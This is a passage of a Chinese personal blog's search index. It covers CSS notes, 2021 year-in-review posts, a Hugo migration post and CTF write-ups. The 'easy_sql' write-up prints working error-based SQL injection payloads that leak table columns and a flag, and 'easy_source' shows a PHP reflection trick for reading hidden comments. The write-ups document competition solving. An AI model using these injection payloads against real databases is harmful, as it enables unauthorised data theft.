}\r真正项目还是需要一个一个标签清除标签。 清除默认样式表 normalize.css 对默认样式进行了统一 reset.css 直接去除了浏览器的默认样式 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:7","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#浏览器默认样式"},{"categories":null,"content":"\r盒子的尺寸默认情况下，盒子可见框大小由内容区、内边距、边框共同决定。可以设置box-sizing属性值设置盒子尺寸计算方式： content-box 默认值，宽度高度设置内容区大小 border-box 宽度高度值设置整个盒子可见框大小，即会调整自动调整内容区大小 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:8","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#盒子的尺寸"},{"categories":null,"content":"\r轮廓阴影和圆角box-shadow设置元素阴影样式，阴影不会影响页面布局。缩写格式 text box-shadow: 水平偏移量 垂直偏移量 阴影的模糊半径 阴影的颜色\routline属性用来设置元素的轮廓线，用法和border一样，区别是轮廓线不会影响可见框大小，边框占用可见框大小。 border-radius属性设置圆角，圆角设置园的半径大小 浮动 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:9","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#轮廓阴影和圆角"},{"categories":null,"content":"\r浮动浮动主要作用是让页面中的元素进行水平排列。 浮动的特点： 浮动的元素会完全脱离文档流，不在占据文档中的位置。不需要满足水平等式 设置浮动会向父元素的左侧或右侧移动。浮动元素默认不会从父元素中移出 浮动元素向左向右移动时不会超过它前面的元素。向上也不会高过前一个兄弟元素。 脱离文档流的特点： 块元素不在独占页面一行，高度和宽度默认被内容撑开。行内元素脱离文档流以后会变成块元素，特点和块元素一样。脱离文档流以后，不需要区分块元素和行内元素了。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:2:0","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#浮动"},{"categories":null,"content":"\r高度塌陷指在浮动布局中，父元素的高度是由子元素撑开的，但是子元素设置浮动以后脱离文档流，无法撑起父元素导致父元素高度丢失。父元素高度丢失后进一步导致页面布局混乱。 解决办法：为父元素开启BFC（Block Formatting Context）块级格式化环境，开启BFC以后该元素会变成一个独立的布局区域。特点包括： 不会被浮动元素所覆盖 子元素和父元素外边距不会重叠 元素可以包含浮动的子元素 开启BFC的方法： 设置元素浮动（不推荐） 设置元素为行内块元素（会失去宽度） 设置overflow属性为一个非visible的值(hidden) Block formatting context ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:2:1","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#高度塌陷"},{"categories":null,"content":"\rclear属性如果不希望某个元素受到其他浮动元素的影响而改变位置，可以设置clear属性清除影响。可选值：left、right、both（清除两侧中最大影响的那侧）。原理：设置清除浮动以后，浏览器会为元素添加一个上边距，使其位置不受其他元素影响。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:2:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#clear属性"},{"categories":null,"content":"\r使用after伪解决高度塌陷使需要浮动的子类后跟一个清除浮动影响的兄弟类，并设置为块元素独占一行。 css .box1::after{ display: block; clear: both; }\r同样的概念可以解决父类和子类外边距重叠问题 css .box1::before{ display: table; }\rclearfix类可以同时解决高度塌陷和外边距重叠问题 text .clearfix::before, .clearfix::after{ content:''; display: table; clear: both; }\r","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:2:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#使用after伪解决高度塌陷"},{"categories":null,"content":"\r定位通过定位可以将元素摆放到页面中的任意位置，使用position属性来设置定位。可选值： static，默认值，元素是静止的没有开启定位 relative，相对定位 absolute，绝对定位 fixed，固定定位 sticky，粘滞定位 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:3:0","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#定位"},{"categories":null,"content":"\r相对定位使用relative相对定位以后，需要设置offset偏移量来设置元素位置，可选值：top、bottom、left、right，偏移量相对的位置是元素原来在文档流中的位置。 开启相对定位以后会提升元素层级，但是没有脱离文档流。不会元素的性质（块、行内） ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:3:1","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#相对定位"},{"categories":null,"content":"\r绝对定位使用absolute绝对定位以后： 元素会从文档流中脱离，并且改变元素性质（行内变块，宽高被内容撑开） 元素提升一个层级 绝对定位是相对于去包含块进行定位的 包含块指离当前元素最近的祖先块元素，行内元素可不能算。 绝对定位的包含块：离元素最近的，并且开启了定位的祖先元素，如果所有祖先元素都没有开启，则根元素html就是初始包含块。自绝父相 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:3:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#绝对定位"},{"categories":null,"content":"\r固定定位fixed固定定位大部分特点和absolute绝对定位相同，唯一不同的是固定定位永远参照于浏览器的窗口进行定位。广告位 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:3:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#固定定位"},{"categories":null,"content":"\r粘滞定位sticky粘滞定位大部分特点和relative相对定位相同，唯一不同的是可以设置offset属性在其经过滚动到达某个位置时将其固定。IE不兼容 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:3:4","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#粘滞定位"},{"categories":null,"content":"\r补充开启定位后，水平方向布局等式需要添加offset属性的值。 开启定位以后，可以通过设置z-index属性来设置元素层级。越大层级越高，如果为设置层级，则根据元素顺序显示最后的元素。祖先元素的层级再高也不会盖住后代元素 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:3:5","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#补充"},{"categories":["年度总结"],"content":"已经二月才写年度总结的估计只有我把，纯纯的懒狗一条。 ","date":"2022-02-07","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":null,"title":"2021年度总结","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#"},{"categories":["年度总结"],"content":"\r个人总结","date":"2022-02-07","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":null,"title":"2021年度总结","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#个人总结"},{"categories":["年度总结"],"content":"\r学业因为加入了学校组织的DROPS集训队，整个人都把精力投入在里面了，然后把自己学习的笔记和经验总结起来写在博客里，有种丰收的喜悦。和集训队的队友们每周会有分享会，然后还去参加了几次大型的比赛，让我知道天外有天人外有人，经常把自己缩在自己的小圈子里，再厉害也就仅限于自己的小圈子。 下半年的考研，觉得自己努力了，但是又觉得没有努力，还是目标不够明确吧，考研的目标一降再降，最后觉得要个文凭都差不多了，和其他的大佬比起来，自己辣鸡也不是没有原因的，志向都不一样，但是又想成为厉害的人。如果考研不成功的话就打算去就业。 目前的程度也就是在github上找一些项目自己部署到服务器，看着项目的文档自己进行一些配置，感觉距离开发越走越远了，偶尔会找一找项目的代码自己DIY点，确实也挺迷茫的，学又学不进去，之前的学校教的也忘得差不多了，感觉还是考研后和行业脱节了，将来要后追起来。 ","date":"2022-02-07","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:1:0","series":null,"tags":null,"title":"2021年度总结","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#学业"},{"categories":["年度总结"],"content":"\r感情网上认识了一个网友，一起聊了很久最后算是开始了一段网恋吧，但是感觉自己经验还是很少，并且有点喜欢没有拘束的感觉，经常打游戏忘了她，觉得挺内疚的。之前的我也算是个一毛不拔的人，然后开始慢慢的会给她准备一些小礼物，和她在一起也确实让我变得开朗些，不光是和她在一起的时候，和其他的朋友心灵上的交流也变多了，和她在一起也当我打开了心扉吧。 ","date":"2022-02-07","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:2:0","series":null,"tags":null,"title":"2021年度总结","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#感情"},{"categories":["年度总结"],"content":"\r学会用github现在才知道github上的项目真的是人类智慧的结晶，在上面找了好多有趣的项目，目前自己部署的有两个网盘、青龙面板(懂的都懂)、自己的跳板机一堆，想整点什么小工具就可以在上面找到有一样想法的人，然后借鉴一下人家的代码是如何实现的。看一些高分的项目，大概知道了些目前的项目都实现了啥样牛逼的功能，还有一些模块功能的项目，多看些这种，如果将来自己项目开发遇到一样的功能就可能有很大的帮助。 ","date":"2022-02-07","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":null,"title":"2021年度总结","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#学会用github"},{"categories":["年度总结"],"content":"\r思考写博客真的是个记录自己成长的过程的好东西，以后坚持。 走出自己的舒适圈，去看看外面的世界有多大，才知道目前的实力根本不够支撑自己的梦想。 不管遇到什么样的困难，只要觉得目前的路是对的，硬着头皮顶下去，事情总会发生一些转变。 希望能坚持一个目标一直走下去吧。 *保持你的决心❤️ ","date":"2022-02-07","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:4:0","series":null,"tags":null,"title":"2021年度总结","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#思考"},{"categories":["年度总结"],"content":"\r新年快乐🤗年度总结被拖到了农历的年。。。确实是自己懒得离谱（确实懒嗷，这篇文章写了四天了）。年前想写但是又想迁移博客，所以没干，年后家里又置办年货要搭把手，现在咣里咣当就到初二了，属实过太快了。 本来打算写年度总结，但是觉得太长了就改成年度日记吧。我看着手机相册，想起来什么写什么吧。（多图警告⚠️⚠️⚠️） ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#新年快乐"},{"categories":["年度总结"],"content":"\r1-2月回家祭祖的时候遇到了两只大鹅，憨憨的看着我 真的是人生第一次吃必胜客的披萨，因为是个宅所以出校门的机会都不多。(真心觉得必胜客的披萨也就一般般) 在小黑盒上抽奖，中了一个鼠标垫，人生第二次网络上中奖，最重要的还是隔了半个月连中。 第一次中奖是B站的一个up名字叫大果粒粒，一周一更的搞笑视频，属于是生活必需品了，周指活。中了50块红包😋 ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#1-2月"},{"categories":["年度总结"],"content":"\r3-5月三月份吧，去学校就是被封在里面，好像一直到6月份放暑假都在学校，只有周日可以出去一天，我们学校还是一个单独一个学院在市中心，地方也不大真能憋死人。打听我发小的学校，通知说的到学校需要14天隔离，但是到学校第二天就睁一只眼闭一只眼，随便出门了，岂可修。 现在疫情还没放开，去学校的话估计还是要封校，我和室友们都讨论过这话题，我们上了大学四年因为疫情姑且在学校封了半年，我们下面的2019级，到学校也就出门过半年，现在都封校到大三了，更惨的是2020级新生，从进学校就被封在里面，现在已经大二了，这感觉真的是换了个地方上高中。 我们学校上面的领导也是脑子不好使，整个学校除了学生，其他任何人都可以随便出入，包括我们学校被当做停车场这件事，只要你给钱，我们学校车随便停，所以也有了学生开着车把人带出去，这件事更离谱，学工办的老师都把监控调出来了，清清楚楚看见车牌，没有去车管所找这辆车车主是谁，反而在学校的班长群里问车里出来的人谁认识。学校还有各种事真听得脑壳疼。 继续流水账。 宿舍某次出门聚餐吃了烤羊腿，这个腿啊，真的是一言难尽，我们宿舍6个人带个蹭饭的同学7个人，这个羊腿的套餐没份都不够，比如只有4-5个，让我们分的很不舒服，并且这个腿吃着完全没有味道！好多地方嚼不动。已经被我标记了 今年更得番《奇蛋物语》感觉太棒了，剧情讲的很完美，每个女生都有自己的伤口，也都有自己战斗的理由。很多角色身上的弱点性格，在自己身边和自己身上都有见过，只是当时的自己也没有深入思考过如何面对，看这部番也给了一个自己思考的机会。总之就是看完以后然我也觉得充满了力量。 我姐在她楼下的蛋糕店办了个卡，办卡送了一个蛋糕但是我姐一个人吃不完，刚好我和爸妈一起去我姐那，就把蛋糕领回家吃了。🐭🐭我啊，最喜欢吃甜甜的蛋糕了 我姐特别想养小狗，让我舅帮忙找了一只崽回家，看这睡得狗仰马翻，还有一张闻着我臭jio睡的就不发了。再多的就不说了。 在宿舍基本上就是一星期总要喝一桶可乐，后来觉得不养生室友就一起买那种临期奶，又便宜又能换换口味，当时我们宿舍和室友的女朋友的宿舍，一起合买了17箱奶，后来还是一两个星期都干差不多了。冰山一角↓ 对面宿舍买了个包子玩具，说是解压玩儿的，这我不好说了。我和一个室友看上了，也在网上买了两个 我找到了一张照片，是我早上爬起来发现嘴边有点痒，用照相机一拍，原来是蚊子在我嘴上叮了一口，我淦 2021年4月18日，Steam上的《绣湖:旅馆》白给了，可惜已经买了被小刺。 给我爸换了新手机红米K40。 我姐NS到了，让我盯着游戏打折买游戏，当时买了健身环、动森。后来打折还买了塞尔达、分手厨房、奥德赛。 大概5月份成了预备党员。 指环王重映了，这估计是我姐在高中那会看的，想再看一遍但又找不到人，就叫上我一起，我顺便蹭我姐饭/大笑。那阵子指环王是一周上一一部，一共三部曲看了三个星期。 ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#3-5月"},{"categories":["年度总结"],"content":"\r6月在宿舍楼里看到外面风景很棒，就随手拍了 还有一天，外面狂风大作，感觉吹得风打的雷劈的闪电都能把楼给拆了，但是那天却可以在宿舍里暖暖和和的打游戏，头一次在宿舍感觉到了家的感觉😂（过了几天还有一件大事，只我知道，标下日期2021.6.4） 在我姐那，刚好举着手机拍外面，发现了一个自由的气球上天了 在我姐那玩的健身环，这游戏雀食好啊，雀食好 人生第一次出去打比赛去河大打的，大佬说比赛是非常非常非常非常非常非常水的比赛，我们组只拿了三等奖，不过算是体验一把了，下面这个颁奖仪式还有个视频被传网上很火，B站视频找不到了，贴个相关的新闻里面有视频。主要还是体验一把学校报销费用打比赛。 今天在学校还学成了点外卖，一个星期就要去吃一次汉堡，主要还是学校食堂太小，一进里面就根本想不出哪家的饭还能吃下，越想越想直接扭头回宿舍。为此我还在闲鱼上买了个饿了吗年卡，30块，有点膈应的就是会找你要验证码，在卖家哪登陆，这么便宜主要还是把淘宝上的88会员给拆开卖了，我还买过一年的网易云黑胶40多。 这是半个榴莲，我同学的表弟给他送过去吃，他带回宿舍室友都不吃，臭味多少有点冲，吃不完就给我了，我和我一个室友知道这榴莲可是大补，两个人一会儿怼了一半😋 下半年打的全国大学生信息安全竞赛，本来我觉得自己刚加集训队菜的离谱，大佬们还是带着我组了四人队，先是线上赛打了两天，集训队的两个队伍进分赛区了，接下来去的武汉华科大打的，看了看人家学校真的是慕的直流口水，人家这学校才叫大学。分赛区的举办方在有点远的地方包了酒店，原价380一晚的房间选手只用100多还是200多我忘了，反正那个酒店是我目前住过最豪华的（反正自己也没住过多少酒店就是了），大大的落地窗还有小冰柜，冰柜里面还有可乐雪碧，太爽咯！早上自助餐也挺丰盛。 选手就位 最后成绩是打了分赛区的第二名一等奖，有了总决赛资格，分赛区第一名是三巨头实在打不过。打完比赛回学校集训队老师还发了新闻到学校官网，人生第一次上学校官网新闻。 同学空间整活，直呼太艺术了 ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#6月"},{"categories":["年度总结"],"content":"\r7月最奇妙的一个月 在家里屋顶上拍的好风景 接下来就是去哈工大打总决赛，是第二次坐飞机，第一次坐飞机是和我姐去贝加尔湖。专门挑的挨窗户的位置，但是这个窗户有划痕拍的不好看 飞机餐没啥看的就不放了，还有一张拍了很小很小很小的月亮 哈尔滨站 刚到的第一个酒店进去就一股霉味，然后整个房间都是那种很阴森的感觉，我们四个人都觉的不太舒服就换了个。 第一次去哈工大 晚上也不知道怎么吃饭，就几个人一起出去吃了铁锅炖大鹅，听了好久了终于吃上一次正宗的。 然后就是比赛的内容了。 总结这次比赛就是我们被爆锤，对比赛的重点没有把握好，第一天CTF算是比较正常的题，就是每个队伍的题是抽的，有的队伍抽的简单题就小不公平，然后就是加了一个叫可信计算的题目，大伙基本上都是第一次听说，比赛让我负责的这块我摸索了半天也没啥头绪，不过其他队伍也没解出多少。（最后比赛完听有的队伍说，有一道题的git仓库没有删掉，可以利用分支回溯原来的代码，太艹了） 第二天是被吊起来打的一天，我们队经验最多的总共也就参加过2-3次AWD比赛，这次比赛还禁用了靶机一些指令导致防御方面失算了，不过主要原因也怪我，因为我是主要负责这个方面的，分赛区的时候用WatchBird太舒服了，导致这次比赛大意了还是想一招吃遍天，这次比赛注重的就是防御，因为靶机一轮如果被攻击就会直接扣100分，但是攻击一次其他队伍才2分，总共也就80多个队伍，算上防御完美的想要稳分数只有不被打。然后我们比赛还出现了最逆天的一幕，因为靶机宕机会扣分，比赛有一个队伍没人来按理说应该是最后一名，但是我们队因为一直被打，然后修的慌慌张张导致好几轮靶机宕机，我们是倒一！ 这次总决赛属实是拉胯了，不过也真心地明白了自己是有多菜，之前分赛区的成绩很彩但也不好说。第一天打完老师就把我们叫到宾馆好好说了一顿，老师说他们也不容易向学校申请我们这次来的经费，然后拿个三等奖才刚好能把费用持平blablabla，还好总决赛不算太激烈，80个队伍79个都能拿到奖，最后我们也是拿了个三等奖末尾回家了。 比赛还有最吸引人的地方就是华为之夜，因为华为是举办方所以晚上有顿大餐，所以我们打进总决赛还有个目标就是华为之夜。 入场的时候会发一张奖券，然后主持人就在上面组织一场小游戏抽一波奖，大伙都在下面坐的急不可耐，一等奖是华为mate40 pro、二等奖是华为手表，剩下的都是些手环、摄像头、音响啥的不值钱。我们队伍最后是四个人三个三等奖，我拿了个手环，最最最最劲爆的消息就是：我们其中一位带队老师，中了一等奖！当时我们看到我们老师上台的时候人都傻了（因为老师去和其他学校搞关系了没和我们坐一起），更羡慕的是我们这位老师这次比赛其实带着自己老婆来哈尔滨玩一玩，然后美滋滋的抱着mate40 pro回家了，我们老师中了奖，我们也觉得不虚此行。赛后我们四个人就去打卡哈尔滨了。 去了中央大街 一直走到头江上的小酒吧，当时还驻场歌手在船上唱歌，我们就坐着听了好久吹了吹江边的风 然后就是回家的时候，我们和老师没有订同一班的飞机但是时间都差不多，我们订了第二天7月19号中午11点的飞机但是延误了，就赶快找下一班的飞机是晚上18点，那天晚上在候机厅等了好久，一起玩原神，也就是这次带了一个队友开始入坑原神。我华为之夜中的一个手环还落到酒店了，当时老师的飞机停机已经安排了住宿，就托老师帮我回酒店拿了下，结果我们的飞机也不停的延误延误，最后等到0点乘客在前台和服务员理论，安排了辆车把我们送到酒店（和老师是同一个的，第二天我就去找老师拿东西了）。 ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#7月"},{"categories":["年度总结"],"content":"\r7·20特大暴雨飞机通知第二天7月20号八点起飞，那天黑龙江天气特好也算是准时起飞了，就是落地跟上了郑州7·20特大暴雨的全程。 我们当时落郑州的时候，就在郑州上面的云层里震了好一会，大概也有半个小时都是在很厚的云层里飞，什么都看不见，要是没飞机导航估计都不知道去哪了。 我们落地那会算是赶上了好天气，仿佛就是让我们这一班飞机从天上下来一样，外面太阳露了一点雨下的很小。然后我们就坐着城郊线回市区，路上就感觉外面的天气不对劲，当时我记得4点都外面的天气就黑的离大谱，感觉像晚上7点左右的天气 我们最后都转了二号线，但是我姐住处在五号线上和二号线隔了一站需要换乘，我原来不打算换乘，直接走一站过去，但是当我出门的时候人都傻了，看远处公交一半轮胎已经都没了。 原来还有想淌水过去的想法，但是想着背着电脑就算了。又回去换乘了五号线坐到下一站，后来看了五号线被淹的视频就感到小害怕。下一站出站口就没有被淹这么厉害，但是我看周围也没有什么能存贮水的道牙什么的，纯流动的水都已经淹过我鞋底了。我跑了两家超市才买了东西会楼上，第一家因为断网了没办法收银。最最最难的一道坎就是房子在25+楼！！！ 然后就是在那没水没电的三天两夜，每天只上下楼一次保存体力，外出的时候去超市买水买面包，我妈还在小区的群里给我买了个应急的充电宝续命，我用自己电脑反向充电，发现了个平板还有50多的点，玩了玩连连看保持理智。在满屋子跑着找信号给爸妈报状态，无聊的时候拿着吃的和小板凳坐到楼顶看下面十字路口堵车😶‍🌫️ 最气的是啥，我在的这个小区没有电，但是隔壁的小区灯火辉煌，但凡有个电我都能打着单机无限续命。 离开前的当天，我打算去我姐单位找补给，路上看到了真的是经历天灾后的城市，有一点点电影上的那种感觉了。路边都是隧道捞出来的车，到处都是泥泞，我走了好久才找到了一辆能用的共享单车，那几天好像全部的共享单车都免费骑助力郑州恢复，但是网不好使。 天上的直升机 逝者安息。 ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#720特大暴雨"},{"categories":["年度总结"],"content":"\r后半年基本上都是准备考研，等有时间再更。 ","date":"2022-02-03","objectID":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/:0:0","series":null,"tags":null,"title":"2021年度日记","uri":"/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/#后半年"},{"categories":["瞎折腾"],"content":" 大四开始写毕业设计了，在学的过程中想记一记笔记，但是之前的hexo博客没动很久了，就想着把博客搬迁下顺便起个头，激起一些学习的劲头。 ","date":"2022-01-31","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/:0:0","series":null,"tags":["博客搬迁"],"title":"博客搬迁","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/#"},{"categories":["瞎折腾"],"content":"\r为什么选择Hugo因为静态的网站生成框架也没几个，搜索的时候也就hexo、hugo、jekyll。之前用的hexo确实很顺手，但是自己改网站，加功能的时候搞了好多依赖，感觉很臃肿，当时的博客文件夹带上依赖大概就有500+MB，现在换了hugo看下是90MB。 hugo还有一个特点就是生成网站的速度很快。这一点我没有截图作比较，但是明显的感觉hugo比hexo快好多。引用一片文章里的一句话： 根据相关博主提供的数据，他200篇左右的博文用Hexo 需要10分钟去生成静态网页，而Hugo 只需要10秒。 所以感觉要是长期写东西的话，选个好的框架也是个长远的选择。 hugo在github上的⭐也比hexo多。 不过在迁移的过程中，最大的感受就是：Hugo在国内的使用者不多。 网上想要找个合适的教程非常难，然后就是去官网啃英文的文档。而且hugo框架和hexo比起来完全的不一样，鄙人go还没接触过，主要还是自己菜。一开始选了coder这个主题，但是觉得还是对hugo本身的了解不够多，四处碰壁，最后选择了一个有国人维护的也是我现在在用的主题，就是DoIt，这个主题也是从上一代的主题迭代下来的，因为原来的那个已经很久没有维护了(可能觉得已经完工了)。这个主题的教程也很友好，摸完感觉我有点上手了。 ","date":"2022-01-31","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/:0:0","series":null,"tags":["博客搬迁"],"title":"博客搬迁","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/#为什么选择hugo"},{"categories":["瞎折腾"],"content":"\r博客的部署之前使用hexo，在最后使用的时候发现了Travis CI - Test and Deploy with Confidence 持续集成这个好东西，每次在本地写完博客以后push到github的仓库，然后这个app会自动构建博客发布到github pages。 所以这次也是一样的选择，一个仓库用来放博客本体(顺便当一个备份)，使用持续集成发布到github pages和自己服务器里。不过这次学到的是github Actions。因为之前有用过一些自动签到的脚本，所以这个东西也略有了解，差不多就借一个生产环境干一些事情。具体的配置github的官方docs也写的比较清楚还有中文翻译，上手还看了一篇阮老师的博客GitHub Actions 入门教程。 发布到自己服务器上那块感觉处理的还不是很好，找了好几种方法：ftp上传、webhook，最后用了执行git clone的命令从github pages拉仓库。 所以最后的部署的流程就是： 本地push到github仓库 –\u003e 仓库Actions发布到github pages、服务器拉取page仓库。 ","date":"2022-01-31","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/:0:0","series":null,"tags":["博客搬迁"],"title":"博客搬迁","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/#博客的部署"},{"categories":["CTF"],"content":"\reasy_sql在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1’) LIMIT 0,1’ at line 1 过滤的字符有union，所以尝试报错注入，查询版本号。 text admin') and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#\r接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。 最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload text admin') and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#\r回显为：Duplicate column name ’no’，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段 text Duplicate column name '28d9f90a-4120-4ee8-9079-4e7613699510'\r直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了 text admin') and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#\rflag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-} ","date":"2021-08-18","objectID":"/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/:0:0","series":null,"tags":["web","sql注入","php原生类"],"title":"CISCN线上赛库存","uri":"/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/#easy_sql"},{"categories":["CTF"],"content":"\reasy_source使用目录扫描，扫描到了.index.php.swo php 本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？ \u003c?php class User { private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return ++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; } } $rc=$_GET[\"rc\"]; $rb=$_GET[\"rb\"]; $ra=$_GET[\"ra\"]; $rd=$_GET[\"rd\"]; $method= new $rc($ra, $rb); var_dump($method-\u003e$rd());\r看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个$ra、$rb ，源码虽然给出了User类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。 根据提示 虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？ 应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个ReflectionMethod类，并且ReflectionMethod类中刚好有一个getDocComment 方法可以获得注释： 简介：ReflectionMethod 类报告了一个方法的有关信息。类报告了一个方法的有关信息 ReflectionFunctionAbstract::getDocComment — 获取注释内容 源码中初始化创建对象为new $rc($ra, $rb)，传递了两个参数，ReflectionMethod类的初始化魔术方法也提供了两个参数 public ReflectionMethod::__construct ( mixed $class , string $name ) 所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释 payload text ?rc=ReflectionMethod\u0026ra=User\u0026rb=q\u0026rd=getDocComment\r结果 text 你能发现我吗string(152) \"/** * Increment counter * * @final * @static * @access 